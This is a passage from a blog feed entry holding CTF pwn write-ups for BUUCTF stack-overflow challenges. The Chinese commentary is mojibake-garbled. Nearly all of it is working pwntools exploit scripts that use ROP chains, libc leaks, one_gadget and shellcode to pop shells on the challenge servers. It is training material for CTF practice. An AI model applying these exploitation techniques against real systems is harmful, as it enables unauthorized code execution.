class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rl=<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29937</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3")</span></span><br><span class="line">elf = ELF(<span class="string">"./LibC"</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class="line">sla(<span class="string">"Input your choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">ru(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">rl()</span><br><span class="line">rl()</span><br><span class="line">puts = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">print(libc)</span><br><span class="line">libc_base = puts-libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">log.info(<span class="string">"libc base 0x%x"</span>,libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload2=<span class="string">b'A'</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">sl(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>var[13] = â€˜\x11â€™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     &#x3D; lambda                    :p.interactive()</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26219)</span><br><span class="line">payload &#x3D; b&#39;A&#39;*(0x04*13) + p64(17)</span><br><span class="line">print(payload)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>sysytemå’Œ/bin/shéƒ½æœ‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29272)</span><br><span class="line">bin_sh &#x3D; 0x0804A024</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;level2&quot;)</span><br><span class="line">sys &#x3D; elf.plt[&quot;system&quot;]</span><br><span class="line">payload &#x3D; b&#39;A&#39;*(0x88+0x4) + p32(sys) + p32(0) + p32(bin_sh)</span><br><span class="line">print(payload)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="not-the-same-3dsctf-2016ï¼ˆ32ä½writeè°ƒç”¨ï¼‰"><a href="#not-the-same-3dsctf-2016ï¼ˆ32ä½writeè°ƒç”¨ï¼‰" class="headerlink" title="not_the_same_3dsctf_2016ï¼ˆ32ä½writeè°ƒç”¨ï¼‰"></a>not_the_same_3dsctf_2016ï¼ˆ32ä½writeè°ƒç”¨ï¼‰</h2><p>æŠŠbssæ®µä¸Šçš„flagç›´æ¥é€šè¿‡writeå‡½æ•°æ‹¿å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29106)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn9&quot;)</span><br><span class="line">bss&#x3D;0x080eca2d</span><br><span class="line">payload&#x3D;&#39;a&#39;*(0x2d)+p32(0x80489a0)+p32(elf.sym[&#39;write&#39;])+p32(0)+p32(1)+p32(bss)+p32(45)</span><br><span class="line">#print(payload)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>ä¸»è¦æ¥ç†Ÿæ‚‰ä¸€ä¸‹è¿™ä¸ªä¸œè¥¿</p><p>one_gadget</p><p>æœ‰libcåŸºå€ç›´æ¥å°±å¯ä»¥ä¸Šone_gadget</p><blockquote><p>åŠŸèƒ½ï¼šæŸ¥æ‰¾å·²çŸ¥çš„libcä¸­exevce(â€œ/bin/shâ€)è¯­å¥çš„åœ°å€<br>ç”¨æ³•: one_gadget libc-x.xx.so</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29935)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">ru(&quot;here is the gift for u:&quot;)</span><br><span class="line">printf &#x3D; int(ru(&#39;\n&#39;)[2:],16)</span><br><span class="line"></span><br><span class="line">libcbase &#x3D; printf - libc.sym[&quot;printf&quot;]  </span><br><span class="line">one_gadget &#x3D; 0x106ef8</span><br><span class="line">leak(&quot;printf&quot;,libcbase)</span><br><span class="line">sys &#x3D; libcbase + one_gadget</span><br><span class="line">payload &#x3D; str(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27635)</span><br><span class="line"></span><br><span class="line">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">sl(32)</span><br><span class="line">sys &#x3D; 0x4006E6</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x18 + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29338)</span><br><span class="line"></span><br><span class="line">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">sys &#x3D; 0x400490</span><br><span class="line">bin_sh &#x3D; 0x601048</span><br><span class="line">pop_rdi &#x3D; 0x400683</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x18 + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27323)</span><br><span class="line"></span><br><span class="line">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class="line">sys &#x3D; 0x4004C0</span><br><span class="line">bin_sh &#x3D; 0x600A90</span><br><span class="line">pop_rdi &#x3D; 0x4006b3</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x88 + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><blockquote><p>å†™shellcodeè¦æ³¨æ„ä¸åŒæ¶æ„ä¸‹</p><p>shellcodeæ˜¯ä¸åŒçš„</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ret &#x3D; 0x4004c9</span><br><span class="line">bss &#x3D; 0x601080</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">print(len(shellcode))</span><br><span class="line">sla(&quot;tell me your name\n&quot;,shellcode)</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x28 + p64(bss)</span><br><span class="line">sla(&quot;me?\n&quot;,payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><blockquote><p>32ä½putsæ³„éœ²</p><p>ä½†å¥½åƒputçš„gotè¡¨ä¸å¯ä»¥æ³„éœ²</p><p>éœ€è¦è¯•ä¸€è¯•å…¶ä»–çš„</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29708</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(log)</span>:</span></span><br><span class="line">    ru(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Please input new log info:"</span>)</span><br><span class="line">    sl(log)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">    sl(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn14"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line">sl(<span class="string">"administrator"</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">main = <span class="number">0x8048722</span></span><br><span class="line">sys = <span class="number">0x80484D0</span></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x48</span>+<span class="number">0x4</span>) + p32(puts_plt) + p32(main) + p32(printf_got)</span><br><span class="line">add(payload)</span><br><span class="line">getflag()</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">printf = uu32(r(<span class="number">4</span>))</span><br><span class="line">print(printf)</span><br><span class="line">libc = LibcSearcher(<span class="string">"printf"</span>,printf)</span><br><span class="line">libc_base = printf - libc.dump(<span class="string">"printf"</span>)</span><br><span class="line">leak(<span class="string">"printf"</span>,libc_base)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">sl(<span class="string">"administrator"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x48</span>+<span class="number">0x4</span>) + p32(sys) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">add(payload)</span><br><span class="line">getflag()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop-32ä½writeæ³„éœ²"><a href="#é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop-32ä½writeæ³„éœ²" class="headerlink" title="é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop(32ä½writeæ³„éœ²)"></a>é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop(32ä½writeæ³„éœ²)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27242</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn15"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x80484C6</span></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">0</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">write = uu32(r(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">leak(<span class="string">"write"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(sys) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babyrop-64ä½putsæ³„éœ²"><a href="#bjdctf-2020-babyrop-64ä½putsæ³„éœ²" class="headerlink" title="bjdctf_2020_babyrop(64ä½putsæ³„éœ²)"></a>bjdctf_2020_babyrop(64ä½putsæ³„éœ²)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27648</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn17"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4006AD</span></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) +p64(puts_got)+ p64(puts_plt) + p64(main) </span><br><span class="line"></span><br><span class="line">sla(<span class="string">"Pull up your sword and tell me u story!\n"</span>,payload)</span><br><span class="line">puts = uu64(ru(<span class="string">'\n'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">libc_base = puts - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">leak(<span class="string">"puts"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><p>è¿ä¸Šå°±æœ‰</p><h2 id="pwn2-sctf-2016ï¼ˆ32ä½printfæ³„éœ²ï¼‰"><a href="#pwn2-sctf-2016ï¼ˆ32ä½printfæ³„éœ²ï¼‰" class="headerlink" title="pwn2_sctf_2016ï¼ˆ32ä½printfæ³„éœ²ï¼‰"></a>pwn2_sctf_2016ï¼ˆ32ä½printfæ³„éœ²ï¼‰</h2><blockquote><p>å¥½åƒprinfçš„gotè¡¨æ‰“ä¸é€š</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28222</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn19"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("/lib32/libc.so.6")</span></span><br><span class="line">vuln = <span class="number">0x804852F</span></span><br><span class="line">formats = <span class="number">0x80486A8</span></span><br><span class="line">printf_plt = elf.sym[<span class="string">"printf"</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">"atoi"</span>]</span><br><span class="line">sl(<span class="number">-1</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x2c</span>+<span class="number">0x4</span>) + p32(printf_plt) + p32(vuln) + p32(atoi_got)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">atoi = uu32(r(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"atoi"</span>,atoi)</span><br><span class="line">libc_base = atoi - libc.dump(<span class="string">'atoi'</span>)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x2c</span>+<span class="number">0x4</span>) + p32(sys) +p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">sl(<span class="number">-1</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-baby-rop2-64ä½printfæ³„éœ²"><a href="#HarekazeCTF2019-baby-rop2-64ä½printfæ³„éœ²" class="headerlink" title="[HarekazeCTF2019]baby_rop2(64ä½printfæ³„éœ²)"></a>[HarekazeCTF2019]baby_rop2(64ä½printfæ³„éœ²)</h2><blockquote><p>ç»å¸¸ä¼šå‡ºç°æ³„éœ²printfçš„gotè¡¨ä¸è¡Œçš„æƒ…å†µ</p><p>å°½é‡ç”¨å…¶ä»–çš„</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28714</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn21"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line">vuln = <span class="number">0x400636</span></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">ret = <span class="number">0x4004d1</span></span><br><span class="line">printf_plt = elf.sym[<span class="string">"printf"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(vuln) </span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">read = uu64(ru(<span class="string">"What's"</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"read"</span>,read)</span><br><span class="line">libc_base = read - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28640</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn22"</span>)</span><br><span class="line">ru(<span class="string">"Yippie, lets crash: "</span>)</span><br><span class="line">stack = int(ru(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print(stack)</span></span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">"crashme\x00"</span>  + <span class="string">b'A'</span>*(<span class="number">0x16</span><span class="number">-8</span>+<span class="number">4</span>) + p32(stack<span class="number">-0x1c</span>) + shellcode</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¯’å‡å¼€å§‹åˆ·é¢˜&lt;/p&gt;
&lt;h1 id=&quot;BUUï¼ˆæ ˆï¼‰&quot;&gt;&lt;a href=&quot;#BUUï¼ˆæ ˆï¼‰&quot; class=&quot;headerlink&quot; title=&quot;BUUï¼ˆæ ˆï¼‰&quot;&gt;&lt;/a&gt;BUUï¼ˆæ ˆï¼‰&lt;/h1&gt;&lt;h2 id=&quot;warmup-csaw-2016&quot;&gt;&lt;a href=&quot;#warmup-</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>linuxå¤‡å¿˜å½•</title>
    <link href="https://pz1o.top/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>https://pz1o.top/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2021-01-23T06:22:17.000Z</published>
    <updated>2021-02-15T07:02:17.553Z</updated>
    
